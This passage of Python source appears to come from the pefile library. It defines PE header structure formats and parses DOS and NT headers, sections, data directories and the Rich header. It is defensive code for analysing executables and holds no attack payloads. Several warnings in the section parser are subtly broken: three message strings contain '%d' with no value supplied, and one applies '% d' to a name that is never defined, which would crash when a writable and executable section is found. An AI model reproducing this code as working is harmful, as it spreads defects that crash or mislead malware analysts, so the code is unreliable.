    __Var_format__ = ("Var", ("H,Length", "H,ValueLength", "H,Type"))

    __IMAGE_THUNK_DATA_format__ = (
        "IMAGE_THUNK_DATA",
        ("I,ForwarderString,Function,Ordinal,AddressOfData",),
    )

    __IMAGE_THUNK_DATA64_format__ = (
        "IMAGE_THUNK_DATA",
        ("Q,ForwarderString,Function,Ordinal,AddressOfData",),
    )

    __IMAGE_DEBUG_DIRECTORY_format__ = (
        "IMAGE_DEBUG_DIRECTORY",
        (
            "I,Characteristics",
            "I,TimeDateStamp",
            "H,MajorVersion",
            "H,MinorVersion",
            "I,Type",
            "I,SizeOfData",
            "I,AddressOfRawData",
            "I,PointerToRawData",
        ),
    )

    __IMAGE_BASE_RELOCATION_format__ = (
        "IMAGE_BASE_RELOCATION",
        ("I,VirtualAddress", "I,SizeOfBlock"),
    )

    __IMAGE_BASE_RELOCATION_ENTRY_format__ = (
        "IMAGE_BASE_RELOCATION_ENTRY",
        ("H,Data",),
    )

    __IMAGE_TLS_DIRECTORY_format__ = (
        "IMAGE_TLS_DIRECTORY",
        (
            "I,StartAddressOfRawData",
            "I,EndAddressOfRawData",
            "I,AddressOfIndex",
            "I,AddressOfCallBacks",
            "I,SizeOfZeroFill",
            "I,Characteristics",
        ),
    )

    __IMAGE_TLS_DIRECTORY64_format__ = (
        "IMAGE_TLS_DIRECTORY",
        (
            "Q,StartAddressOfRawData",
            "Q,EndAddressOfRawData",
            "Q,AddressOfIndex",
            "Q,AddressOfCallBacks",
            "I,SizeOfZeroFill",
            "I,Characteristics",
        ),
    )

    __IMAGE_LOAD_CONFIG_DIRECTORY_format__ = (
        "IMAGE_LOAD_CONFIG_DIRECTORY",
        (
            "I,Size",
            "I,TimeDateStamp",
            "H,MajorVersion",
            "H,MinorVersion",
            "I,GlobalFlagsClear",
            "I,GlobalFlagsSet",
            "I,CriticalSectionDefaultTimeout",
            "I,DeCommitFreeBlockThreshold",
            "I,DeCommitTotalFreeThreshold",
            "I,LockPrefixTable",
            "I,MaximumAllocationSize",
            "I,VirtualMemoryThreshold",
            "I,ProcessHeapFlags",
            "I,ProcessAffinityMask",
            "H,CSDVersion",
            "H,Reserved1",
            "I,EditList",
            "I,SecurityCookie",
            "I,SEHandlerTable",
            "I,SEHandlerCount",
            "I,GuardCFCheckFunctionPointer",
            "I,Reserved2",
            "I,GuardCFFunctionTable",
            "I,GuardCFFunctionCount",
            "I,GuardFlags",
        ),
    )

    __IMAGE_LOAD_CONFIG_DIRECTORY64_format__ = (
        "IMAGE_LOAD_CONFIG_DIRECTORY",
        (
            "I,Size",
            "I,TimeDateStamp",
            "H,MajorVersion",
            "H,MinorVersion",
            "I,GlobalFlagsClear",
            "I,GlobalFlagsSet",
            "I,CriticalSectionDefaultTimeout",
            "Q,DeCommitFreeBlockThreshold",
            "Q,DeCommitTotalFreeThreshold",
            "Q,LockPrefixTable",
            "Q,MaximumAllocationSize",
            "Q,VirtualMemoryThreshold",
            "Q,ProcessAffinityMask",
            "I,ProcessHeapFlags",
            "H,CSDVersion",
            "H,Reserved1",
            "Q,EditList",
            "Q,SecurityCookie",
            "Q,SEHandlerTable",
            "Q,SEHandlerCount",
            "Q,GuardCFCheckFunctionPointer",
            "Q,Reserved2",
            "Q,GuardCFFunctionTable",
            "Q,GuardCFFunctionCount",
            "I,GuardFlags",
        ),
    )

    __IMAGE_BOUND_IMPORT_DESCRIPTOR_format__ = (
        "IMAGE_BOUND_IMPORT_DESCRIPTOR",
        ("I,TimeDateStamp", "H,OffsetModuleName", "H,NumberOfModuleForwarderRefs"),
    )

    __IMAGE_BOUND_FORWARDER_REF_format__ = (
        "IMAGE_BOUND_FORWARDER_REF",
        ("I,TimeDateStamp", "H,OffsetModuleName", "H,Reserved"),
    )

    __RUNTIME_FUNCTION_format__ = (
        "RUNTIME_FUNCTION",
        ("I,BeginAddress", "I,EndAddress", "I,UnwindData"),
    )

    def __init__(
        self,
        name=None,
        data=None,
        fast_load=None,
        max_symbol_exports=MAX_SYMBOL_EXPORT_COUNT,
        max_repeated_symbol=120,
    ):

        self.max_symbol_exports = max_symbol_exports
        self.max_repeated_symbol = max_repeated_symbol

        self._get_section_by_rva_last_used = None

        self.sections = []

        self.__warnings = []

        self.PE_TYPE = None

        if name is None and data is None:
            raise ValueError("Must supply either name or data")

        # This list will keep track of all the structures created.
        # That will allow for an easy iteration through the list
        # in order to save the modifications made
        self.__structures__ = []
        self.__from_file = None

        # We only want to print these warnings once
        self.FileAlignment_Warning = False
        self.SectionAlignment_Warning = False

        # Count of total resource entries across nested tables
        self.__total_resource_entries_count = 0
        # Sum of the size of all resource entries parsed, which should not
        # exceed the file size.
        self.__total_resource_bytes = 0
        # The number of imports parsed in this file
        self.__total_import_symbols = 0

        fast_load = fast_load if fast_load is not None else globals()["fast_load"]
        try:
            self.__parse__(name, data, fast_load)
        except:
            self.close()
            raise

    def __enter__(self):
        return self

    def __exit__(self, type, value, traceback):
        self.close()

    def close(self):
        if (
            self.__from_file is True
            and hasattr(self, "__data__")
            and (
                (isinstance(mmap.mmap, type) and isinstance(self.__data__, mmap.mmap))
                or "mmap.mmap" in repr(type(self.__data__))
            )
        ):
            self.__data__.close()
            del self.__data__

    def __unpack_data__(self, format, data, file_offset):
        """Apply structure format to raw data.

        Returns an unpacked structure object if successful, None otherwise.
        """

        structure = Structure(format, file_offset=file_offset)

        try:
            structure.__unpack__(data)
        except PEFormatError as err:
            self.__warnings.append(
                'Corrupt header "{0}" at file offset {1}. Exception: {2}'.format(
                    format[0], file_offset, err
                )
            )
            return None

        self.__structures__.append(structure)

        return structure

    def __parse__(self, fname, data, fast_load):
        """Parse a Portable Executable file.

        Loads a PE file, parsing all its structures and making them available
        through the instance's attributes.
        """

        if fname is not None:
            stat = os.stat(fname)
            if stat.st_size == 0:
                raise PEFormatError("The file is empty")
            fd = None
            try:
                fd = open(fname, "rb")
                self.fileno = fd.fileno()
                if hasattr(mmap, "MAP_PRIVATE"):
                    # Unix
                    self.__data__ = mmap.mmap(self.fileno, 0, mmap.MAP_PRIVATE)
                else:
                    # Windows
                    self.__data__ = mmap.mmap(self.fileno, 0, access=mmap.ACCESS_READ)
                self.__from_file = True
            except IOError as excp:
                exception_msg = "{0}".format(excp)
                exception_msg = exception_msg and (": %s" % exception_msg)
                raise Exception(
                    "Unable to access file '{0}'{1}".format(fname, exception_msg)
                )
            finally:
                if fd is not None:
                    fd.close()
        elif data is not None:
            self.__data__ = data
            self.__from_file = False

        # Resources should not overlap each other, so they should not exceed the
        # file size.
        self.__resource_size_limit_upperbounds = len(self.__data__)
        self.__resource_size_limit_reached = False

        if not fast_load:
            for byte, byte_count in Counter(bytearray(self.__data__)).items():
                # Only report the cases where a byte makes up for more than 50% (if
                # zero) or 15% (if non-zero) of the file's contents. There are
                # legitimate PEs where 0x00 bytes are close to 50% of the whole
                # file's contents.
                if (byte == 0 and 1.0 * byte_count / len(self.__data__) > 0.5) or (
                    byte != 0 and 1.0 * byte_count / len(self.__data__) > 0.15
                ):
                    self.__warnings.append(
                        (
                            "Byte 0x{0:02x} makes up {1:.4f}% of the file's contents."
                            " This may indicate truncation / malformation."
                        ).format(byte, 100.0 * byte_count / len(self.__data__))
                    )

        dos_header_data = self.__data__[:64]
        if len(dos_header_data) != 64:
            raise PEFormatError(
                "Unable to read the DOS Header, possibly a truncated file."
            )

        self.DOS_HEADER = self.__unpack_data__(
            self.__IMAGE_DOS_HEADER_format__, dos_header_data, file_offset=0
        )

        if self.DOS_HEADER.e_magic == IMAGE_DOSZM_SIGNATURE:
            raise PEFormatError("Probably a ZM Executable (not a PE file).")
        if not self.DOS_HEADER or self.DOS_HEADER.e_magic != IMAGE_DOS_SIGNATURE:
            raise PEFormatError("DOS Header magic not found.")

        # OC Patch:
        # Check for sane value in e_lfanew
        #
        if self.DOS_HEADER.e_lfanew > len(self.__data__):
            raise PEFormatError("Invalid e_lfanew value, probably not a PE file")

        nt_headers_offset = self.DOS_HEADER.e_lfanew

        self.NT_HEADERS = self.__unpack_data__(
            self.__IMAGE_NT_HEADERS_format__,
            self.__data__[nt_headers_offset : nt_headers_offset + 8],
            file_offset=nt_headers_offset,
        )

        # We better check the signature right here, before the file screws
        # around with sections:
        # OC Patch:
        # Some malware will cause the Signature value to not exist at all
        if not self.NT_HEADERS or not self.NT_HEADERS.Signature:
            raise PEFormatError("NT Headers not found.")

        if (0xFFFF & self.NT_HEADERS.Signature) == IMAGE_NE_SIGNATURE:
            raise PEFormatError("Invalid NT Headers signature. Probably a NE file")
        if (0xFFFF & self.NT_HEADERS.Signature) == IMAGE_LE_SIGNATURE:
            raise PEFormatError("Invalid NT Headers signature. Probably a LE file")
        if (0xFFFF & self.NT_HEADERS.Signature) == IMAGE_LX_SIGNATURE:
            raise PEFormatError("Invalid NT Headers signature. Probably a LX file")
        if (0xFFFF & self.NT_HEADERS.Signature) == IMAGE_TE_SIGNATURE:
            raise PEFormatError("Invalid NT Headers signature. Probably a TE file")
        if self.NT_HEADERS.Signature != IMAGE_NT_SIGNATURE:
            raise PEFormatError("Invalid NT Headers signature.")

        self.FILE_HEADER = self.__unpack_data__(
            self.__IMAGE_FILE_HEADER_format__,
            self.__data__[nt_headers_offset + 4 : nt_headers_offset + 4 + 32],
            file_offset=nt_headers_offset + 4,
        )
        image_flags = retrieve_flags(IMAGE_CHARACTERISTICS, "IMAGE_FILE_")

        if not self.FILE_HEADER:
            raise PEFormatError("File Header missing")

        # Set the image's flags according the the Characteristics member
        set_flags(self.FILE_HEADER, self.FILE_HEADER.Characteristics, image_flags)

        optional_header_offset = nt_headers_offset + 4 + self.FILE_HEADER.sizeof()

        # Note: location of sections can be controlled from PE header:
        sections_offset = optional_header_offset + self.FILE_HEADER.SizeOfOptionalHeader

        self.OPTIONAL_HEADER = self.__unpack_data__(
            self.__IMAGE_OPTIONAL_HEADER_format__,
            # Read up to 256 bytes to allow creating a copy of too much data
            self.__data__[optional_header_offset : optional_header_offset + 256],
            file_offset=optional_header_offset,
        )

        # According to solardesigner's findings for his
        # Tiny PE project, the optional header does not
        # need fields beyond "Subsystem" in order to be
        # loadable by the Windows loader (given that zeros
        # are acceptable values and the header is loaded
        # in a zeroed memory page)
        # If trying to parse a full Optional Header fails
        # we try to parse it again with some 0 padding
        #
        MINIMUM_VALID_OPTIONAL_HEADER_RAW_SIZE = 69

        if (
            self.OPTIONAL_HEADER is None
            and len(
                self.__data__[optional_header_offset : optional_header_offset + 0x200]
            )
            >= MINIMUM_VALID_OPTIONAL_HEADER_RAW_SIZE
        ):

            # Add enough zeros to make up for the unused fields
            #
            padding_length = 128

            # Create padding
            #
            padded_data = self.__data__[
                optional_header_offset : optional_header_offset + 0x200
            ] + (b"\0" * padding_length)

            self.OPTIONAL_HEADER = self.__unpack_data__(
                self.__IMAGE_OPTIONAL_HEADER_format__,
                padded_data,
                file_offset=optional_header_offset,
            )

        # Check the Magic in the OPTIONAL_HEADER and set the PE file
        # type accordingly
        #
        if self.OPTIONAL_HEADER is not None:

            if self.OPTIONAL_HEADER.Magic == OPTIONAL_HEADER_MAGIC_PE:

                self.PE_TYPE = OPTIONAL_HEADER_MAGIC_PE

            elif self.OPTIONAL_HEADER.Magic == OPTIONAL_HEADER_MAGIC_PE_PLUS:

                self.PE_TYPE = OPTIONAL_HEADER_MAGIC_PE_PLUS

                self.OPTIONAL_HEADER = self.__unpack_data__(
                    self.__IMAGE_OPTIONAL_HEADER64_format__,
                    self.__data__[
                        optional_header_offset : optional_header_offset + 0x200
                    ],
                    file_offset=optional_header_offset,
                )

                # Again, as explained above, we try to parse
                # a reduced form of the Optional Header which
                # is still valid despite not including all
                # structure members
                #
                MINIMUM_VALID_OPTIONAL_HEADER_RAW_SIZE = 69 + 4

                if (
                    self.OPTIONAL_HEADER is None
                    and len(
                        self.__data__[
                            optional_header_offset : optional_header_offset + 0x200
                        ]
                    )
                    >= MINIMUM_VALID_OPTIONAL_HEADER_RAW_SIZE
                ):

                    padding_length = 128
                    padded_data = self.__data__[
                        optional_header_offset : optional_header_offset + 0x200
                    ] + (b"\0" * padding_length)
                    self.OPTIONAL_HEADER = self.__unpack_data__(
                        self.__IMAGE_OPTIONAL_HEADER64_format__,
                        padded_data,
                        file_offset=optional_header_offset,
                    )

        if not self.FILE_HEADER:
            raise PEFormatError("File Header missing")

        # OC Patch:
        # Die gracefully if there is no OPTIONAL_HEADER field
        # 975440f5ad5e2e4a92c4d9a5f22f75c1
        if self.OPTIONAL_HEADER is None:
            raise PEFormatError("No Optional Header found, invalid PE32 or PE32+ file.")
        if self.PE_TYPE is None:
            self.__warnings.append(
                "Invalid type 0x{0:04x} in Optional Header.".format(
                    self.OPTIONAL_HEADER.Magic
                )
            )

        dll_characteristics_flags = retrieve_flags(
            DLL_CHARACTERISTICS, "IMAGE_DLLCHARACTERISTICS_"
        )

        # Set the Dll Characteristics flags according the the DllCharacteristics member
        set_flags(
            self.OPTIONAL_HEADER,
            self.OPTIONAL_HEADER.DllCharacteristics,
            dll_characteristics_flags,
        )

        self.OPTIONAL_HEADER.DATA_DIRECTORY = []
        # offset = (optional_header_offset + self.FILE_HEADER.SizeOfOptionalHeader)
        offset = optional_header_offset + self.OPTIONAL_HEADER.sizeof()

        self.NT_HEADERS.FILE_HEADER = self.FILE_HEADER
        self.NT_HEADERS.OPTIONAL_HEADER = self.OPTIONAL_HEADER

        # Windows 8 specific check
        #
        if (
            self.OPTIONAL_HEADER.AddressOfEntryPoint
            < self.OPTIONAL_HEADER.SizeOfHeaders
        ):
            self.__warnings.append(
                "SizeOfHeaders is smaller than AddressOfEntryPoint: this file "
                "cannot run under Windows 8."
            )

        # The NumberOfRvaAndSizes is sanitized to stay within
        # reasonable limits so can be casted to an int
        #
        if self.OPTIONAL_HEADER.NumberOfRvaAndSizes > 0x10:
            self.__warnings.append(
                "Suspicious NumberOfRvaAndSizes in the Optional Header. "
                "Normal values are never larger than 0x10, the value is: 0x%x"
                % self.OPTIONAL_HEADER.NumberOfRvaAndSizes
            )

        MAX_ASSUMED_VALID_NUMBER_OF_RVA_AND_SIZES = 0x100
        for i in range(int(0x7FFFFFFF & self.OPTIONAL_HEADER.NumberOfRvaAndSizes)):

            if len(self.__data__) - offset == 0:
                break

            if len(self.__data__) - offset < 8:
                data = self.__data__[offset:] + b"\0" * 8
            else:
                data = self.__data__[
                    offset : offset + MAX_ASSUMED_VALID_NUMBER_OF_RVA_AND_SIZES
                ]

            dir_entry = self.__unpack_data__(
                self.__IMAGE_DATA_DIRECTORY_format__, data, file_offset=offset
            )

            if dir_entry is None:
                break

            # Would fail if missing an entry
            # 1d4937b2fa4d84ad1bce0309857e70ca offending sample
            try:
                dir_entry.name = DIRECTORY_ENTRY[i]
            except (KeyError, AttributeError):
                break

            offset += dir_entry.sizeof()

            self.OPTIONAL_HEADER.DATA_DIRECTORY.append(dir_entry)

            # If the offset goes outside the optional header,
            # the loop is broken, regardless of how many directories
            # NumberOfRvaAndSizes says there are
            #
            # We assume a normally sized optional header, hence that we do
            # a sizeof() instead of reading SizeOfOptionalHeader.
            # Then we add a default number of directories times their size,
            # if we go beyond that, we assume the number of directories
            # is wrong and stop processing
            if offset >= (
                optional_header_offset + self.OPTIONAL_HEADER.sizeof() + 8 * 16
            ):

                break

        offset = self.parse_sections(sections_offset)

        # OC Patch:
        # There could be a problem if there are no raw data sections
        # greater than 0
        # fc91013eb72529da005110a3403541b6 example
        # Should this throw an exception in the minimum header offset
        # can't be found?
        #
        rawDataPointers = [
            self.adjust_FileAlignment(
                s.PointerToRawData, self.OPTIONAL_HEADER.FileAlignment
            )
            for s in self.sections
            if s.PointerToRawData > 0
        ]

        if len(rawDataPointers) > 0:
            lowest_section_offset = min(rawDataPointers)
        else:
            lowest_section_offset = None

        if not lowest_section_offset or lowest_section_offset < offset:
            self.header = self.__data__[:offset]
        else:
            self.header = self.__data__[:lowest_section_offset]

        # Check whether the entry point lies within a section
        #
        if (
            self.get_section_by_rva(self.OPTIONAL_HEADER.AddressOfEntryPoint)
            is not None
        ):

            # Check whether the entry point lies within the file
            #
            ep_offset = self.get_offset_from_rva(
                self.OPTIONAL_HEADER.AddressOfEntryPoint
            )
            if ep_offset > len(self.__data__):

                self.__warnings.append(
                    "Possibly corrupt file. AddressOfEntryPoint lies outside the"
                    " file. AddressOfEntryPoint: 0x%x"
                    % self.OPTIONAL_HEADER.AddressOfEntryPoint
                )

        else:

            self.__warnings.append(
                "AddressOfEntryPoint lies outside the sections' boundaries. "
                "AddressOfEntryPoint: 0x%x" % self.OPTIONAL_HEADER.AddressOfEntryPoint
            )

        if not fast_load:
            self.full_load()

    def parse_rich_header(self):
        """Parses the rich header
        see http://www.ntcore.com/files/richsign.htm for more information

        Structure:
        00 DanS ^ checksum, checksum, checksum, checksum
        10 Symbol RVA ^ checksum, Symbol size ^ checksum...
        ...
        XX Rich, checksum, 0, 0,...
        """

        # Rich Header constants
        #
        DANS = 0x536E6144  # 'DanS' as dword
        RICH = 0x68636952  # 'Rich' as dword

        rich_index = self.__data__.find(
            b"Rich", 0x80, self.OPTIONAL_HEADER.get_file_offset()
        )
        if rich_index == -1:
            return None

        # Read a block of data
        try:
            # The end of the structure is 8 bytes after the start of the Rich
            # string.
            rich_data = self.__data__[0x80 : rich_index + 8]
            # Make the data have length a multiple of 4, otherwise the
            # subsequent parsing will fail. It's not impossible that we retrieve
            # truncated data that it's not a multiple.
            rich_data = rich_data[: 4 * int(len(rich_data) / 4)]
            data = list(
                struct.unpack("<{0}I".format(int(len(rich_data) / 4)), rich_data)
            )
            if RICH not in data:
                return None
        except PEFormatError:
            return None

        # get key, raw_data and clear_data
        key = struct.pack("<L", data[data.index(RICH) + 1])
        result = {"key": key}

        raw_data = rich_data[: rich_data.find(b"Rich")]
        result["raw_data"] = raw_data

        ord_ = lambda c: ord(c) if not isinstance(c, int) else c

        clear_data = bytearray()
        for idx, val in enumerate(raw_data):
            clear_data.append((ord_(val) ^ ord_(key[idx % len(key)])))
        result["clear_data"] = bytes(clear_data)

        # the checksum should be present 3 times after the DanS signature
        #
        checksum = data[1]
        if data[0] ^ checksum != DANS or data[2] != checksum or data[3] != checksum:
            return None

        result["checksum"] = checksum
        headervalues = []
        result["values"] = headervalues

        data = data[4:]
        for i in range(int(len(data) / 2)):

            # Stop until the Rich footer signature is found
            #
            if data[2 * i] == RICH:

                # it should be followed by the checksum
                #
                if data[2 * i + 1] != checksum:
                    self.__warnings.append("Rich Header is malformed")
                break

            # header values come by pairs
            #
            headervalues += [data[2 * i] ^ checksum, data[2 * i + 1] ^ checksum]
        return result

    def get_warnings(self):
        """Return the list of warnings.

        Non-critical problems found when parsing the PE file are
        appended to a list of warnings. This method returns the
        full list.
        """

        return self.__warnings

    def show_warnings(self):
        """Print the list of warnings.

        Non-critical problems found when parsing the PE file are
        appended to a list of warnings. This method prints the
        full list to standard output.
        """

        for warning in self.__warnings:
            print(">", warning)

    def full_load(self):
        """Process the data directories.

        This method will load the data directories which might not have
        been loaded if the "fast_load" option was used.
        """

        self.parse_data_directories()

        class RichHeader:
            pass

        rich_header = self.parse_rich_header()
        if rich_header:
            self.RICH_HEADER = RichHeader()
            self.RICH_HEADER.checksum = rich_header.get("checksum", None)
            self.RICH_HEADER.values = rich_header.get("values", None)
            self.RICH_HEADER.key = rich_header.get("key", None)
            self.RICH_HEADER.raw_data = rich_header.get("raw_data", None)
            self.RICH_HEADER.clear_data = rich_header.get("clear_data", None)
        else:
            self.RICH_HEADER = None

    def write(self, filename=None):
        """Write the PE file.

        This function will process all headers and components
        of the PE file and include all changes made (by just
        assigning to attributes in the PE objects) and write
        the changes back to a file whose name is provided as
        an argument. The filename is optional, if not
        provided the data will be returned as a 'str' object.
        """

        file_data = bytearray(self.__data__)

        for structure in self.__structures__:
            struct_data = bytearray(structure.__pack__())
            offset = structure.get_file_offset()
            file_data[offset : offset + len(struct_data)] = struct_data

        if hasattr(self, "VS_VERSIONINFO"):
            if hasattr(self, "FileInfo"):
                for finfo in self.FileInfo:
                    for entry in finfo:
                        if hasattr(entry, "StringTable"):
                            for st_entry in entry.StringTable:
                                for key, entry in list(st_entry.entries.items()):

                                    # Offsets and lengths of the keys and values.
                                    # Each value in the dictionary is a tuple:
                                    #  (key length, value length)
                                    # The lengths are in characters, not in bytes.
                                    offsets = st_entry.entries_offsets[key]
                                    lengths = st_entry.entries_lengths[key]

                                    if len(entry) > lengths[1]:
                                        l = entry.decode("utf-8").encode("utf-16le")
                                        file_data[
                                            offsets[1] : offsets[1] + lengths[1] * 2
                                        ] = l[: lengths[1] * 2]
                                    else:
                                        encoded_data = entry.decode("utf-8").encode(
                                            "utf-16le"
                                        )
                                        file_data[
                                            offsets[1] : offsets[1] + len(encoded_data)
                                        ] = encoded_data

        new_file_data = file_data
        if not filename:
            return new_file_data

        f = open(filename, "wb+")
        f.write(new_file_data)
        f.close()
        return

    def parse_sections(self, offset):
        """Fetch the PE file sections.

        The sections will be readily available in the "sections" attribute.
        Its attributes will contain all the section information plus "data"
        a buffer containing the section's data.

        The "Characteristics" member will be processed and attributes
        representing the section characteristics (with the 'IMAGE_SCN_'
        string trimmed from the constant's names) will be added to the
        section instance.

        Refer to the SectionStructure class for additional info.
        """

        self.sections = []
        MAX_SIMULTANEOUS_ERRORS = 3
        for i in range(self.FILE_HEADER.NumberOfSections):
            if i >= MAX_SECTIONS:
                self.__warnings.append(
                    "Too many sections {0} (>={1})".format(
                        self.FILE_HEADER.NumberOfSections, MAX_SECTIONS
                    )
                )
                break
            simultaneous_errors = 0
            section = SectionStructure(self.__IMAGE_SECTION_HEADER_format__, pe=self)
            if not section:
                break
            section_offset = offset + section.sizeof() * i
            section.set_file_offset(section_offset)
            section_data = self.__data__[ section_offset : section_offset + section.sizeof() ]
            # Check if the section is all nulls and stop if so.
            if count_zeroes(section_data) == section.sizeof():
                self.__warnings.append("Invalid section %d. Contents are null-bytes." % i)
                break
            if not section_data:
                self.__warnings.append( "Invalid section %d. No data in the file (is this corkami's virtsectblXP?)." % i)
                break
            section.__unpack__(section_data)
            self.__structures__.append(section)

            if section.SizeOfRawData + section.PointerToRawData > len(self.__data__):
                simultaneous_errors += 1
                self.__warnings.append( "Error parsing section %d. SizeOfRawData is larger than file." % i)

            if self.adjust_FileAlignment(
                section.PointerToRawData, self.OPTIONAL_HEADER.FileAlignment
            ) > len(self.__data__):
                simultaneous_errors += 1
                self.__warnings.append( "Error parsing section %d. PointerToRawData points beyond the end of the file." % i)

            if section.Misc_VirtualSize > 0x10000000:
                simultaneous_errors += 1
                self.__warnings.append( "Suspicious value found parsing section %d. VirtualSize is extremely large > 256MiB.")

            if (
                self.adjust_SectionAlignment(
                    section.VirtualAddress,
                    self.OPTIONAL_HEADER.SectionAlignment,
                    self.OPTIONAL_HEADER.FileAlignment,
                )
                > 0x10000000
            ):
                simultaneous_errors += 1
                self.__warnings.append( "Suspicious value found parsing section %d. VirtualAddress is beyond 0x10000000." % i)

            if (
                self.OPTIONAL_HEADER.FileAlignment != 0
                and (section.PointerToRawData % self.OPTIONAL_HEADER.FileAlignment) != 0
            ):
                simultaneous_errors += 1
                self.__warnings.append(
                    ( "Error parsing section %d. PointerToRawData should normally be a multiple of FileAlignment, this might imply the file is trying to confuse tools which parse this incorrectly.")
                    )

            if simultaneous_errors >= MAX_SIMULTANEOUS_ERRORS:
                self.__warnings.append("Too many warnings parsing section. Aborting.")
                break

            section_flags = retrieve_flags(SECTION_CHARACTERISTICS, "IMAGE_SCN_")

            # Set the section's flags according the the Characteristics member
            set_flags(section, section.Characteristics, section_flags)

            if section.__dict__.get(
                "IMAGE_SCN_MEM_WRITE", False
            ) and section.__dict__.get("IMAGE_SCN_MEM_EXECUTE", False):

                if section.Name.rstrip(b"\x00") == b"PAGE" and self.is_driver():
                    # Drivers can have a PAGE section with those flags set without
                    # implying that it is malicious
                    pass
                else:
                    self.__warnings.append( "Suspicious flags set for section %d. Both IMAGE_SCN_MEM_WRITE and IMAGE_SCN_MEM_EXECUTE are set. This might indicate a packed executable." % d)

            self.sections.append(section)

        # Sort the sections by their VirtualAddress and add a field to each of them
        # with the VirtualAddress of the next section. This will allow to check
        # for potentially overlapping sections in badly constructed PEs.
        self.sections.sort(key=lambda a: a.VirtualAddress)
        for idx, section in enumerate(self.sections):
            if idx == len(self.sections) - 1:
                section.next_section_virtual_address = None
            else:
                section.next_section_virtual_address = self.sections[
                    idx + 1
                ].VirtualAddress

        if self.FILE_HEADER.NumberOfSections > 0 and self.sections:
            return (
                offset + self.sections[0].sizeof() * self.FILE_HEADER.NumberOfSections
            )
        else:
            return offset

    def parse_data_directories(
        self, directories=None, forwarded_exports_only=False, import_dllnames_only=False
    ):
        """Parse and process the PE file's data directories.

        If the optional argument 'directories' is given, only
        the directories at the specified indexes will be parsed.
        Such functionality allows parsing of areas of interest
        without the burden of having to parse all others.
        The directories can then be specified as:

        For export / import only:

          directories = [ 0, 1 ]

        or (more verbosely):

          directories = [ DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT'],
            DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT'] ]

        If 'directories' is a list, the ones that are processed will be removed,
        leaving only the ones that are not present in the image.

        If `forwarded_exports_only` is True, the IMAGE_DIRECTORY_ENTRY_EXPORT
        attribute will only contain exports that are forwarded to another DLL.

        If `import_dllnames_only` is True, symbols will not be parsed from
        the import table and the entries in the IMAGE_DIRECTORY_ENTRY_IMPORT
        attribute will not have a `symbols` attribute.
        """

        directory_parsing = (
            ("IMAGE_DIRECTORY_ENTRY_IMPORT", self.parse_import_directory),
            ("IMAGE_DIRECTORY_ENTRY_EXPORT", self.parse_export_directory),
            ("IMAGE_DIRECTORY_ENTRY_RESOURCE", self.parse_resources_directory),
            ("IMAGE_DIRECTORY_ENTRY_DEBUG", self.parse_debug_directory),
            ("IMAGE_DIRECTORY_ENTRY_BASERELOC", self.parse_relocations_directory),
            ("IMAGE_DIRECTORY_ENTRY_TLS", self.parse_directory_tls),
            ("IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG", self.parse_directory_load_config),
            ("IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT", self.parse_delay_import_directory),
            ("IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT", self.parse_directory_bound_imports),
            ("IMAGE_DIRECTORY_ENTRY_EXCEPTION", self.parse_exceptions_directory),
        )

        if directories is not None:
            if not isinstance(directories, (tuple, list)):
                directories = [directories]

        for entry in directory_parsing:
            # OC Patch:
            #
            try:
                directory_index = DIRECTORY_ENTRY[entry[0]]
                dir_entry = self.OPTIONAL_HEADER.DATA_DIRECTORY[directory_index]
            except IndexError:
                break

            # Only process all the directories if no individual ones have
            # been chosen
            #
            if directories is None or directory_index in directories:

                value = None
                if dir_entry.VirtualAddress:
                    if (
                        forwarded_exports_only
                        and entry[0] == "IMAGE_DIRECTORY_ENTRY_EXPORT"
                    ):
                        value = entry[1](
                            dir_entry.VirtualAddress,
                            dir_entry.Size,
                            forwarded_only=True,
                        )
                    elif (
                        import_dllnames_only
                        and entry[0] == "IMAGE_DIRECTORY_ENTRY_IMPORT"
                    ):
                        value = entry[1](
                            dir_entry.VirtualAddress, dir_entry.Size, dllnames_only=True
                        )

                    else:
                        try:
                            value = entry[1](dir_entry.VirtualAddress, dir_entry.Size)
                        except PEFormatError as excp:
                            self.__warnings.append( 'Failed to process directory %r: %r' %(entry[0], excp))
                    if value:
                        setattr(self, entry[0][6:], value)

            if (
                (directories is not None)
                and isinstance(directories, list)
                and (entry[0] in directories)
            ):
                directories.remove(directory_index)

    def parse_exceptions_directory(self, rva, size):
        """Parses exception directory

        All the code related to handling exception directories is documented in
        https://auscitte.github.io/systems%20blog/Exception-Directory-pefile#implementation-details
        """

        # "For x64 and Itanium platforms; the format is different for other platforms"
        if (
            self.FILE_HEADER.Machine != MACHINE_TYPE["IMAGE_FILE_MACHINE_AMD64"]
            and self.FILE_HEADER.Machine != MACHINE_TYPE["IMAGE_FILE_MACHINE_IA64"]
        ):
            return None

        rf = Structure(self.__RUNTIME_FUNCTION_format__)
        rf_size = rf.sizeof()
        rva2rt = {}
        rt_funcs = []
        rva2infos = {}
        for _ in range(size // rf_size):
            rf = self.__unpack_data__(
                self.__RUNTIME_FUNCTION_format__,
                self.get_data(rva, rf_size),
                file_offset=self.get_offset_from_rva(rva),
            )

            if rf is None:
                break

            ui = None

            if (rf.UnwindData & 0x1) == 0:
                # according to "Improving Automated Analysis of Windows x64 Binaries",
                # if the lowest bit is set, (UnwindData & ~0x1) should point to the
                # chained RUNTIME_FUNCTION instead of UNWIND_INFO

                if (
                    rf.UnwindData in rva2infos
                ):  # unwind info data structures can be shared among functions
                    ui = rva2infos[rf.UnwindData]
                else:
                    ui = UnwindInfo(file_offset=self.get_offset_from_rva(rf.UnwindData))
                    rva2infos[rf.UnwindData] = ui

                ws = ui.unpack_in_stages(self.get_data(rf.UnwindData, ui.sizeof()))
                if ws != None:
                    self.__warnings.append(ws)
                    break
                ws = ui.unpack_in_stages(self.get_data(rf.UnwindData, ui.sizeof()))
                if ws != None:
                    self.__warnings.append(ws)
                    break

                self.__structures__.append(ui)

            entry = ExceptionsDirEntryData(struct=rf, unwindinfo=ui)
            rt_funcs.append(entry)

            rva2rt[rf.BeginAddress] = entry
            rva += rf_size

        # each chained function entry holds a reference to the function first in chain
        for rf in rt_funcs:
            if rf.unwindinfo is None:
                # TODO: have not encountered such a binary yet;
                # in theory, (UnwindData & ~0x1) should point to the chained
                # RUNTIME_FUNCTION which could be used to locate the corresponding
                # ExceptionsDirEntryData and set_chained_function_entry()
                continue
            if not hasattr(rf.unwindinfo, "FunctionEntry"):
                continue
